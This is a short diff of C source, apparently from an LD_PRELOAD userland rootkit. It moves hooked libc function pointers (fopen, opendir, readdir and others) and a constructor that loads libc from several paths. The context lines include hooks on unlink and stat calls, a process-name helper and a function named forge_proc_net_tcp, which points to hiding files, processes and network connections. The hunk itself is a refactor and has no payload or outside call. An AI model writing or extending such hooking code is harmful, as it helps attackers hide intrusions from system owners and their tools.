@@ -33,6 +33,31 @@ static int (*old_unlink) (const char *pathname);
 static int (*old_unlinkat) (int dirfd, const char *pathname, int flags);
 static int (*old_xstat) (int ver, const char *path, struct stat * buf);
 static int (*old_xstat64) (int ver, const char *path, struct stat64 * buf);
+
+static FILE *(*old_fopen) (const char *filename, const char *mode);
+static FILE *(*old_fopen64) (const char *filename, const char *mode);
+static DIR *(*old_opendir) (const char *name);
+static struct dirent *(*old_readdir) (DIR * dir);
+static struct dirent64 *(*old_readdir64) (DIR * dir);
+
+void
+__attribute ((constructor))
+init (void)
+{
+    if (!libc){
+        libc = dlopen ("/lib64/libc.so.6", RTLD_LAZY);
+        if (!libc){
+            libc = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
+            if (!libc){
+                libc = dlopen ("/lib/libc.so.6", RTLD_LAZY);
+                if (!libc){
+                    libc = dlopen ("/lib/i386-linux-gnu/libc.so.6", RTLD_LAZY);
+                }
+            }
+        }
+    }
+}
+
 static int get_dir_name(DIR* dirp, char* buf, size_t size)
 {
     int fd = dirfd(dirp);
@@ -77,31 +102,6 @@ static int get_process_name(char* pid, char* buf)
     return 1;
 }
 
-static FILE *(*old_fopen) (const char *filename, const char *mode);
-static FILE *(*old_fopen64) (const char *filename, const char *mode);
-
-static DIR *(*old_opendir) (const char *name);
-
-static struct dirent *(*old_readdir) (DIR * dir);
-static struct dirent64 *(*old_readdir64) (DIR * dir);
-
-void
-__attribute ((constructor))
-init (void)
-{
-    if (!libc){
-        libc = dlopen ("/lib64/libc.so.6", RTLD_LAZY);
-        if (!libc){
-            libc = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
-            if (!libc){
-                libc = dlopen ("/lib/libc.so.6", RTLD_LAZY);
-                if (!libc){
-                    libc = dlopen ("/lib/i386-linux-gnu/libc.so.6", RTLD_LAZY);
-                }
-            }
-        }
-    }
-}
 FILE *
 forge_proc_net_tcp (const char *filename)
 {
